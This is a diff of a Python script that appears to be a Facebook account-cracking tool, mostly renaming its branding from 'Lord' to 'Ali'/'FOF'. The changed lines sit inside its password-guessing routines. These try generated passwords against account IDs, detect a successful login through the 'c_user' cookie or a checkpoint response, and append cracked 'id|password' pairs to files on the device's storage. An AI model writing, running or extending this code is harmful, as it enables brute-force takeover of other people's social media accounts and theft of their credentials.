@@ -6,7 +6,7 @@ print('[\033[1;32m✓\033[1;37m] تحقق من انت مشترك ')
 time.sleep(1.5)
 os.system('git pull')
 os.system('clear')
-print('[\033[1;32m✓\033[1;37m] نورت الاده \033[1;32m✓\033[1;37m مدفوعة حك لورد :) ')
+print('[\033[1;32m✓\033[1;37m] نورت الاده \033[1;32m✓\033[1;37m مدفوعه حك علش :) ')
 time.sleep(2)
 os.system(f'xdg-open https://facebook.com/groups/842909060147288/ ')
 try:
@@ -119,9 +119,9 @@ logo=(f"""\x1b[1;97m
 (_)         (_)(_)(_)(_)(_)(_)(_)(_)(_)
 
 \033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
- Author    : Lord Ali
+ Author    : علش
  Github    :X11
- Tool Name : \033[1;36m MgaicLord\033[1;37m
+ Tool Name : \033[1;36m ali\033[1;37m
  plus : \033[1;31mAli\033[1;37m
  Version   : \033[1;36m1.2\033[1;37m
 \033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
@@ -207,7 +207,7 @@ def ali():
 				
 def m1(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [Lord] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [Ali] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -231,13 +231,13 @@ def m1(ids,names,passlist):
                                 print(f'\r\r\033[1;32m [FOF\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                 #cek_apk(session,coki)
                                 #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
-                                open(f'/sdcard/Lord•OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
+                                open(f'/sdcard/FOF•OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Fof:
                                 if 'y' in pcp:
                                         print(f'\r\r\x1b[38;5;208m [FOF•CP] '+ids+' • '+pas+'\033[1;97m')
-                                        open(f'/sdcard/Lord•CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        open(f'/sdcard/FOF•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -250,7 +250,7 @@ def m1(ids,names,passlist):
                         
 def m3(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [Lord] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [FOF] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -271,16 +271,16 @@ def m3(ids,names,passlist):
                         if "c_user" in Fof:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [Lord\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
+                                print(f'\r\r\033[1;32m [FOF\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                 #cek_apk(session,coki)
                                 #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
-                                open(f'/sdcard/LORD•OK•M3.txt', 'a').write(ids+'|'+pas+'\n')
+                                open(f'/sdcard/FOF•OK•M3.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Fof:
                                 if 'y' in pcp:
                                         print(f'\r\r\x1b[38;5;208m [Ali•CP] '+ids+' • '+pas+'\033[1;97m')
-                                        open(f'/sdcard/Lord•CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        open(f'/sdcard/ali•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -293,7 +293,7 @@ def m3(ids,names,passlist):
 
 def m2(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [Lord] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [FOF] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -314,16 +314,16 @@ def m2(ids,names,passlist):
                         if "c_user" in Fof:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [Lord\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
+                                print(f'\r\r\033[1;32m [FOF\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                 #cek_apk(session,coki)
                                 #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
-                                open(f'/sdcard/Lord•OK•M2.txt', 'a').write(ids+'|'+pas+'\n')
+                                open(f'/sdcard/FOF•OK•M2.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Fof:
                                 if 'y' in pcp:
                                         print(f'\r\r\x1b[38;5;208m [FOF•CP] '+ids+' • '+pas+'\033[1;97m')
-                                        open(f'/sdcard/Lord•CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        open(f'/sdcard/FOF•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -336,7 +336,7 @@ def m2(ids,names,passlist):
 
 def m4(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [LORD] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [FOF] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -360,7 +360,7 @@ def m4(ids,names,passlist):
                                 print(f'\r\r\033[1;32m [FOF\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                 #cek_apk(session,coki)
                                 #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
-                                open(f'/sdcard/Lord•OK•M4.txt', 'a').write(ids+'|'+pas+'\n')
+                                open(f'/sdcard/ali•OK•M4.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Fof:
@@ -378,4 +378,4 @@ def m4(ids,names,passlist):
         loop+=1
 
 
-Lord()
+ali()
